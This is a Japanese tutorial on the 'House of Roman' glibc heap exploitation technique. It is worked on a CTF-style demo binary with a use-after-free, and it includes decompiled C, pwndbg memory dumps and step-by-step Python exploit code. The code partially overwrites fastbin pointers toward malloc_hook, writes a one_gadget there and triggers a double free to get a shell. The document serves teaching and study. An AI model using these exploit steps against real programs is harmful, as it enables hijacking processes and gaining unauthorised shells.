# House of Roman

## はじめに

House of Roman という技法は、簡単に言えば fastbin attack と Unsortbin attack を組み合わせた小さな trick です。

## 概要



この手法は ASLR を回避するためのもので、12 ビットのブルートフォースによって shell を取得します。しかも、UAF の脆弱性が 1 つと、任意のサイズの chunk を作成できる状況さえあれば攻撃を完了できます。



## 原理と実演



作者は実演用の demo を提供してくれています。攻撃の全体の流れはおおよそ 3 つのステップに分けられます。

1. FD を malloc_hook に向ける
2. 0x71 の Freelist を修正する
3. malloc_hook に one gadget を書き込む



まず demo を大まかに分析します。

有効になっている保護は次のとおりです。

```bash
[*] '/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

サンプル問題には Malloc、Write、Free の 3 つの主な機能があります。

```c
    switch ( v4 )
    {
      case 1:
        puts("Malloc");
        v5 = malloc_chunk("Malloc");
        if ( !v5 )
          puts("Error");
        break;
      case 2:
        puts("Write");
        write_chunk("Write");
        break;
      case 3:
        puts("Free");
        free_chunk();
        break;
      default:
        puts("Invalid choice");
        break;
```

Free の機能には、ポインタが 0 クリアされないために生じるダングリングポインタがあります。

```c
void free_chunk()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]@1

  printf("\nEnter index :");
  __isoc99_scanf("%d", &v0);
  if ( v0 <= 0x13 )
    free(heap_ptrs[(unsigned __int64)v0]);
}
```



### ステップ 1

まず chunk を 1 つ偽造します。この chunk のサイズは 0x61 です。続いて partial overwrite を使って、FD を偽造した chunk に向けます(もちろん、ここは UAF でも実現できます)。

chunk の size を偽造します。

```bash
pwndbg>
0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141
0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141
0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141
0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141
0x555555757090: 0x41414141      0x41414141      0x61    0x0     <----------
```

ここで chunk 1 を free すると、unsortbin が 1 つ得られます。

```
0x555555757020 PREV_INUSE {
  prev_size = 0x0,
  size = 0xd1,
  fd = 0x7ffff7dd1b58 <main_arena+88>,
  bk = 0x7ffff7dd1b58 <main_arena+88>,
  fd_nextsize = 0x4141414141414141,
  bk_nextsize = 0x4141414141414141
}
```

続いて、この 0xd1 の chunk を再確保し、その size を 0x71 に書き換えます。

```
pwndbg> x/40ag 0x555555757020
0x555555757020: 0x4141414141414141      0x71
0x555555757030: 0x7ffff7dd1b58 <main_arena+88>  0x7ffff7dd1b58 <main_arena+88>
0x555555757040: 0x4141414141414141      0x4141414141414141
0x555555757050: 0x4141414141414141      0x4141414141414141
0x555555757060: 0x4141414141414141      0x4141414141414141
0x555555757070: 0x4141414141414141      0x4141414141414141
0x555555757080: 0x4141414141414141      0x4141414141414141
0x555555757090: 0x4141414141414141      0x61
```



続いて、この 0x71 の FD freelist を修正し、解放済みのブロックに見えるように偽造する必要があります。

```
pwndbg> x/40ag 0x555555757000
0x555555757000: 0x0     0x21
0x555555757010: 0x4141414141414141      0x4141414141414141
0x555555757020: 0x4141414141414141      0x71       <----------  free 0x71
0x555555757030: 0x7ffff7dd1b58 <main_arena+88>  0x7ffff7dd1b58 <main_arena+88>
0x555555757040: 0x4141414141414141      0x4141414141414141
0x555555757050: 0x4141414141414141      0x4141414141414141
0x555555757060: 0x4141414141414141      0x4141414141414141
0x555555757070: 0x4141414141414141      0x4141414141414141
0x555555757080: 0x4141414141414141      0x4141414141414141
0x555555757090: 0x4141414141414141      0x61
0x5555557570a0: 0x0     0x0
0x5555557570b0: 0x0     0x0
0x5555557570c0: 0x0     0x0
0x5555557570d0: 0x0     0x0
0x5555557570e0: 0x0     0x0
0x5555557570f0: 0xd0    0x71   <----------     free 0x71
0x555555757100: 0x0     0x0
0x555555757110: 0x0     0x0
0x555555757120: 0x0     0x0
0x555555757130: 0x0     0x0

```



```
libc : 0x7ffff7a23d28 ("malloc_hook")
```

この時点で FD はすでに malloc hook の近くにあり、後のブルートフォースの準備ができています。

### ステップ 2

0x71 サイズの chunk を 1 つ解放するだけで、修正を完了できます。



### ステップ 3

unsortebin の攻撃テクニックを使い、編集機能で onegadet を書き込みます。



## exp の分析



`3` つの `chunk` を確保し、`B + 0x78` に `p64(0x61)` を設定します。これは `fake size` で、後の `fastbin attack` に使います。



```python
create(0x18,0) # 0x20
create(0xc8,1) # d0
create(0x65,2)  # 0x70

info("create 2 chunk, 0x20, 0xd8")
fake = "A"*0x68
fake += p64(0x61)  ## fake size
edit(1,fake)
info("fake")
```

`B` を解放し、同じサイズで再び確保して `B` を得ます。このとき `B+0x10` と `B+0x18` には `main_arean` のアドレスが入っています。`3` つの `fastbin` を確保し、`off by one` を利用して `B->size = 0x71` に書き換えます。

```
free(1)
create(0xc8,1)

create(0x65,3)  # b
create(0x65,15)
create(0x65,18)

over = "A"*0x18  # off by one
over += "\x71"  # set chunk  1's size --> 0x71
edit(0,over)
info("利用 off by one ,  chunk  1's size --> 0x71")
```

2 つの `fastbin` を作り、`uaf` と部分的なアドレス書き込みによって、`B` を `fastbin` にリンクします。

 

```py
free(2)
free(3)
info("创建两个 0x70 的 fastbin")
heap_po = "\x20"
edit(3,heap_po)
info("把 chunk'1 链入到 fastbin 里面")

```

デバッグして、このときの `fastbin` の状態を見てみましょう。

 

```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x555555757160 —▸ 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x7ffff7dd1b78
0x80: 0x0
```

> `0x555555757020` が `chunk B` です

 続いて `B->fd` の下位 `2` バイトを書き換え、`B->fd= malloc_hook - 0x23` にします。

 

```
# malloc_hook の上方
malloc_hook_nearly = "\xed\x1a"
edit(1,malloc_hook_nearly)
info("部分写，修改 fastbin->fd ---> malloc_hook")

```

その後 `3` つの `0x70` の `chunk` を確保すると、`malloc_hook` のある chunk を得られます。

 

```
create(0x65,0)
create(0x65,0)
create(0x65,0)
```

続いて `E` を `free` して `fastbin` に入れ、`uaf` で `E->fd = 0` を設定して、`fastbin` を修復します。

```
free(15)
edit(15,p64(0x00))
info("再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin")
```

その後 unsorted bin attack を行い、malloc_hook の値を main_arena+88 にします。

 

```
create(0xc8,1)
create(0xc8,1)
create(0x18,2)
create(0xc8,3)
create(0xc8,4)
free(1)
po = "B"*8
po += "\x00\x1b"
edit(1,po)
create(0xc8,1)
info("unsorted bin 使得 malloc_hook 有 libc 的地址")
```

`malloc_hook` の下位 3 バイトを書き換え、`malloc_hook` を `one_gadget` のアドレスにします。

 

```
over = "R"*0x13   # padding for malloc_hook
over += "\xa4\xd2\xaf"
edit(0,over)

info("malloc_hook to one_gadget")
```

その後、同じ `chunk` を 2 回 `free` して `malloc_printerr` を発動させ、`getshell` します。

 

```
free(18)
free(18)
```



## リンク

https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc

https://github.com/romanking98/House-Of-Roman

https://xz.aliyun.com/t/2316
